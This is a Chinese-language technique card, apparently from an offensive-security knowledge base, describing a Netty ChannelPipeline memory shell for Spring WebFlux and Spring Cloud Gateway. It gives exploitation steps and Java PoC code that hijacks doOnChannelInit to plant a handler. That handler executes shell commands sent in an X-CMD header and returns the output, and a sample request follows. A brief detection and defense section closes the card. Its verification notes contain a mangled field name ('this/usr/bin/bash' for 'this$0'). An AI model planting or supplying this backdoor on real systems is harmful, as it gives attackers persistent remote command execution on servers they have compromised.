---
id: web-java-component-netty-pipeline-memshell
title: Netty ChannelPipeline 内存马：替换 doOnChannelInit 注入恶意 Handler
type: scenario
domain: web
path: web/java/component
technique: netty-pipeline-handler-memshell
aliases:
- Netty 内存马
- ChannelPipeline 内存马
- doOnChannelInit 注入
- Spring WebFlux Netty 内存马
- httpTrafficHandler 前插 Handler
tags:
- java
- netty
- spring-webflux
- memshell
- persistence
- channelpipeline
- handler
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:38:18+08:00'
  notes: 已对照原文3.6节核对：反射查找NettyWebServer线程，经this/usr/bin/bash→config/val取doOnChannelInit并替换为恶意ConnectionObserver，onChannelInit中pipeline.addBefore(reactor.left.httpTrafficHandler,memshell_handler,...)，EvilHandler读X-CMD执行并回写响应；原文实测X-CMD whoami成功，任意路径触发。原文只给出流程与片段，卡内PoC为按流程复写。原文未给组件受影响版本，未设置affected_versions。未复现。
---

## 一句话结论

在基于 Netty 的 Spring WebFlux/Spring Cloud Gateway 应用中，已能执行一次 Java 代码时，可反射定位 `NettyWebServer` 的配置链并替换 `doOnChannelInit`，使每个新建 Channel 在初始化时把恶意 Handler 插入 `reactor.left.httpTrafficHandler` 之前；该 Handler 在请求进入 WebFlux 业务链前读取命令头并执行，形成 Netty 层内存马。

## 原理

- Netty 的每个连接对应一个 `ChannelPipeline`，HTTP 请求由 pipeline 上的 Handler 依次处理。Spring WebFlux 默认以 Netty 为容器，关键处理器名为 `reactor.left.httpTrafficHandler`。
- Spring Boot 的 `NettyWebServer` 在启动时通过 `ServerBootstrap` 配置 `doOnChannelInit`（`ConnectionObserver`/`ChannelInitializer` 回调）：每个新 Channel 初始化时执行一次。
- 内存马思路：
  1. 反射 `Thread.getThreads()`（JDK8）或遍历线程组，找到类名包含 `NettyWebServer` 的线程；
  2. 反射取得其配置链：`this$0`（NettyWebServer）→ `config`/`val$disposableServer` → `doOnChannelInit`；
  3. 用恶意 `ConnectionObserver` 替换 `doOnChannelInit` 字段；
  4. 恶意 `onChannelInit` 中执行 `pipeline.addBefore("reactor.left.httpTrafficHandler", "memshell_handler", new EvilHandler())`，确保优先级最高；
  5. `EvilHandler.channelRead` 读取 `X-CMD` 头，执行命令并写回响应。
- 因为 Handler 位于 Reactor HTTP 处理器之前，请求在进入 WebFlux 的 Router/Filter/Controller 之前就被拦截，任意路径均可触发，也不受网关路由白名单限制。

## 触发条件

- 目标为 Netty 驱动的 Spring WebFlux 或 Spring Cloud Gateway（默认 Netty）；
- 攻击者已能执行一次 Java 代码（如 SpEL、反序列化、表达式注入）以调用注入方法；
- 能反射访问 `NettyWebServer` 及 `doOnChannelInit`；
- 目标 Netty/Reactor 版本中处理器名称仍为 `reactor.left.httpTrafficHandler`（版本差异时需按实际 pipeline 名称调整）。

## 利用步骤

1. 反射 `Thread.class.getDeclaredMethod("getThreads")` 或遍历 `ThreadGroup`，找到类名含 `NettyWebServer` 的线程。
2. 从线程反射 `this$0` 得到 `NettyWebServer`，再逐级取 `config`/`val$disposableServer` 与 `doOnChannelInit` 字段。
3. 将 `doOnChannelInit` 替换为恶意 `ConnectionObserver` 实例（或等价的 ChannelInitializer）。
4. 在恶意 `onChannelInit(ConnectionObserver, Channel, SocketAddress)` 中执行：
   `channel.pipeline().addBefore("reactor.left.httpTrafficHandler", "memshell_handler", new EvilHandler());`
5. `EvilHandler` 继承 `ChannelInboundHandlerAdapter`，在 `channelRead` 中读取 `X-CMD` 头，执行命令并把结果写入 `FullHttpResponse`。
6. 触发一次新连接（访问任意路径）使 pipeline 初始化；之后所有新连接均被植入 Handler，携带 `X-CMD` 即可执行命令。

## PoC

```java
// 注入：定位 NettyWebServer 并替换 doOnChannelInit
Method getThreads = Thread.class.getDeclaredMethod("getThreads");
getThreads.setAccessible(true);
Object threads = getThreads.invoke(null);
for (int i = 0; i < Array.getLength(threads); i++) {
  Object t = Array.get(threads, i);
  if (t != null && t.getClass().getName().contains("NettyWebServer")) {
    Object server = getField(t, "this$0");
    Object config = getField(server, "config");            // 或 val$disposableServer
    Object oldObserver = getField(config, "doOnChannelInit");
    setField(config, "doOnChannelInit", new EvilObserver());
  }
}
```

```java
// 恶意 ConnectionObserver：新 Channel 初始化时插入 Handler
class EvilObserver implements ConnectionObserver {
  public void onChannelInit(ConnectionObserver obs, Channel ch, SocketAddress addr) {
    ch.pipeline().addBefore("reactor.left.httpTrafficHandler", "memshell_handler", new EvilHandler());
  }
  public void onStateChange(Connection c, State s) {}
}

class EvilHandler extends ChannelInboundHandlerAdapter {
  public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
    if (msg instanceof HttpRequest) {
      String cmd = ((HttpRequest) msg).headers().get("X-CMD");
      if (cmd != null) {
        String[] c = System.getProperty("os.name").toLowerCase().contains("win")
            ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
        Process p = Runtime.getRuntime().exec(c);
        Scanner s = new Scanner(p.getInputStream(), "GBK").useDelimiter("\\A");
        byte[] body = (s.hasNext() ? s.next() : "").getBytes("GBK");
        FullHttpResponse resp = new DefaultFullHttpResponse(
            HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.wrappedBuffer(body));
        ctx.writeAndFlush(resp);
        return;
      }
    }
    ctx.fireChannelRead(msg);
  }
}
```

```http
GET /inject HTTP/1.1
Host: localhost:8080
X-CMD: whoami
```

## 变体与关联

- 变体：也可通过 `pipeline.addFirst`/`addAfter` 选择其他位置；处理器名称随 Reactor Netty 版本可能变化，需先枚举 pipeline。
- 变体：注入方式可改为反射修改 `ServerBootstrap` 的 childHandler，或利用 Spring Cloud Gateway 的 SpEL 执行入口调用注入逻辑。
- 关联：[[web-java-framework-spring-webflux-filteringwebhandler-memshell]]（WebFlux 过滤器链内存马，位于 Netty 之上的框架层）；[[web-java-component-tomcat-executor-memshell]]（Tomcat 连接器层对应物）。
- 边界：仅 Netty 容器；Undertow/Tomcat 不适用；重启清空；pipeline 名称/字段结构随版本变化。

## 检测与防御

- 检测：运行期 ChannelPipeline 出现非业务 Handler 名称（如 `memshell_handler`）且位于 `reactor.left.httpTrafficHandler` 之前；`doOnChannelInit` 被替换为匿名/自定义观察者；请求中出现 `X-CMD` 等自定义头。
- 处置：重启应用；通过 Netty 内存分析/Arthas 枚举 ChannelPipeline 与 `doOnChannelInit`。
- 防御：封堵任意代码执行入口；RASP 监控 `pipeline.addBefore`、`doOnChannelInit` 字段写入；网关层限制未知请求头与异常响应。
